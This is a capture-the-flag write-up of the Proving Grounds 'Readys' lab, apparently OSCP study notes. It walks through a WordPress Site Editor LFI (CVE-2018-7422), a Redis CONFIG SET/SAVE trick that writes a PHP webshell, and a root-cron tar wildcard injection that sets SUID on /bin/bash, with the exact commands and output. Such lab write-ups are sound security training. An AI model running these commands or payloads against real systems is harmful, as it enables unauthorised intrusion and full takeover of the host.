# Readys — Proving Grounds

> [!abstract] Summary
> Readys chains three vulnerabilities for the foothold and a separate one for root. WordPress on port 80 runs the **Site Editor 1.1.1** plugin, vulnerable to **Local File Inclusion** (CVE-2018-7422, EDB-44340). The LFI reads `/etc/redis/redis.conf` and leaks the Redis password `Ready4Redis?`. Authenticated **Redis** (port 6379) is abused with `CONFIG SET dir/dbfilename` + `SAVE` to write a PHP webshell into `/opt/redis-files/`, which is then executed **through the same LFI** — giving command execution as `alice`. Privilege escalation is a root cron job running `tar -cf ... *` in a writable directory, abused with GNU tar's `--checkpoint-action` wildcard injection to SUID `/bin/bash`.

**Target:** `192.168.142.166`

## Methodology

1. Scan all TCP ports; identify WordPress (80) and Redis (6379).
2. Enumerate WordPress with `wpscan`; find the Site Editor 1.1.1 plugin.
3. Use the Site Editor LFI (CVE-2018-7422) to read `/etc/passwd` and `/etc/redis/redis.conf`, recovering the Redis password.
4. Write a PHP webshell with Redis, then include + execute it via the LFI → shell as `alice`.
5. Abuse a root cron `tar * ` job via wildcard injection for root.

The exploit (EDB-44340 / CVE-2018-7422) documents the vulnerable parameter:

```
** CVE description **
A Local File Inclusion vulnerability in the Site Editor plugin through 1.1.1 for WordPress allows remote
attackers to retrieve arbitrary files via the ajax_path parameter to
editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php.

** Technical details **
In site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php:5, the value of the
ajax_path parameter is used for including a file with PHP's require_once(). This parameter can be
controlled by an attacker and is not properly sanitized.

Vulnerable code:
if( isset( $_REQUEST['ajax_path'] ) && is_file( $_REQUEST['ajax_path'] ) && file_exists( $_REQUEST['ajax_path'] ) ){
    require_once $_REQUEST['ajax_path'];
}

** Proof of Concept **
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

> [!info] Why this matters
> The sink is `require_once()`, not `file_get_contents()`. That means this is not just a *file read* — if we can get PHP source onto disk somewhere and point `ajax_path` at it, the plugin will **execute** it. That is exactly how the Redis step below turns a config leak into code execution.

## Redis exploitation — PHP webshell via `SAVE`

Connect to Redis with the password:

```
redis-cli -h $IP -p 6379 -a 'Ready4Redis?'
```

The plan is to abuse Redis's file-writing to drop a PHP webshell into `/opt/redis-files/` (Redis can write there; Apache can read/include it through the LFI). The actual session:

```
┌──(kali㉿kali)-[~/Downloads]
└─$ redis-cli -h 192.168.142.166 -p 6379 -a 'Ready4Redis?'
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
192.168.142.166:6379> ping
PONG
192.168.142.166:6379> CONFIG SET dir /opt/redis-files/
OK
192.168.142.166:6379> CONFIG SET dbfilename shell.php
OK (0.91s)
192.168.142.166:6379> SET payload "<?php system($_GET['cmd']); ?>"
OK
192.168.142.166:6379> SAVE
OK
```

> [!warning] Learning note — Redis `SAVE` writes an RDB dump, not a clean PHP file
> After `SAVE`, including the file returned binary (`curl` warned "Binary output can mess up your terminal"). The reason: `SAVE` serializes the whole database into an **RDB-formatted dump**, which begins with the magic bytes `REDIS` and contains binary serialization around your payload — it is not a pristine `.php` file.
>
> This still works here because PHP's parser ignores everything outside `<?php ... ?>` tags: the `<?php system($_GET['cmd']); ?>` payload embedded inside the RDB binary is still found and executed when the file is `require_once`'d. If a payload does *not* execute, diagnose it rather than re-running `SAVE`:
> ```
> curl -s ".../ajax_shortcode_pattern.php?ajax_path=/opt/redis-files/shell.php" -o redis_dump
> file redis_dump
> xxd -l 64 redis_dump        # look for the REDIS magic at the start
> strings redis_dump | head   # confirm the <?php payload survived
> ```
> From Redis, `CONFIG GET dir`, `CONFIG GET dbfilename` and `INFO persistence` confirm where/what was written. The takeaway: `SET`+`SAVE` stores a key and dumps the DB — it does not "create a PHP file"; the payload merely rides along inside the dump.

## Privilege escalation — tar wildcard injection via root cron

### Step 1 — Enumerate cron

```
cat /etc/crontab
```

The interesting entry runs every three minutes as root:

```
*/3 * * * * root /usr/local/bin/backup.sh
```

Inspect the script:

```
cat /usr/local/bin/backup.sh
```

The important operation is a wildcard archive run from `/var/www/html` (which our user can write to):

```
tar -cf /opt/backups/website.tar *
```

### Step 2 — Why the wildcard is exploitable

When the shell expands `*`, filenames beginning with `--` are passed to `tar` as options. GNU tar supports:

- `--checkpoint=1` — act after every record.
- `--checkpoint-action=exec=...` — run a command at each checkpoint.

So filenames become root-executed commands.

### Step 3–4 — Drop the payload and the option-filenames

```
cd /var/www/html

echo '#!/bin/bash' > exploit.sh
echo 'chmod u+s /bin/bash' >> exploit.sh
chmod +x exploit.sh

touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=bash exploit.sh"
```

`exploit.sh` sets the SUID bit on `/bin/bash`. When the root cron runs `tar ... *`, the two `--checkpoint*` files are interpreted as options and `exploit.sh` executes as root.

### Step 5 — Wait for cron and watch for the SUID bit

```
watch -n 5 'ls -la /bin/bash'
```

Expected once it fires:

```
-rwsr-xr-x 1 root root ... /bin/bash
```

> [!note]
> The `watch` command refreshes its output every few seconds and holds the terminal. Press **`Ctrl + C`** to exit `watch` and return to the normal prompt; this does not terminate the shell or undo the SUID change. At this point the SUID bit on `/bin/bash` was confirmed: `-rwsr-xr-x 1 root root ... /bin/bash`.

### Step 6 — Root shell

```
/bin/bash -p
id
whoami
```

Expected:

```
uid=1000(alice) gid=1000(alice) euid=0(root) egid=0(root)
```

`-p` preserves the elevated effective UID, giving root.

## Complete attack chain

1. **Nmap** → ports 22, 80, 6379.
2. **wpscan** → Site Editor 1.1.1.
3. **LFI (CVE-2018-7422 / EDB-44340)** → read `/etc/redis/redis.conf`, recover `Ready4Redis?`.
4. **Redis** → `CONFIG SET dir/dbfilename` + `SAVE` writes a PHP webshell into `/opt/redis-files/`.
5. **Foothold** → include the webshell through the LFI → command execution as `alice`; upgrade to a reverse shell.
6. **Privesc** → root cron `tar -cf ... *` wildcard injection → SUID `/bin/bash`.
7. **Root** → `bash -p`.

## Key OSCP takeaways

| Technique | What to remember |
|---|---|
| LFI | Read sensitive config files (and look for `require_once` sinks that also execute) |
| Redis | Abuse authenticated Redis file-writing (`CONFIG SET dir/dbfilename` + `SAVE`) |
| WordPress | Enumerate vulnerable plugins and versions |
| Redis + LFI | `SAVE` writes an RDB dump, not clean PHP — the `<?php ?>` payload still executes when included |
| Reverse shell | Convert command execution into an interactive shell, then stabilize with `pty` |
| Cron enumeration | Inspect `/etc/crontab` and the scripts it references |
| Tar wildcard | Look for `tar * ` and abuse `--checkpoint-action=exec=` |
| SUID | `bash -p` preserves elevated effective privileges |

**Most important lesson:** the interesting part of Readys is chaining three vulnerabilities — WordPress LFI → Redis file write → PHP execution — followed by a separate tar wildcard privilege escalation.
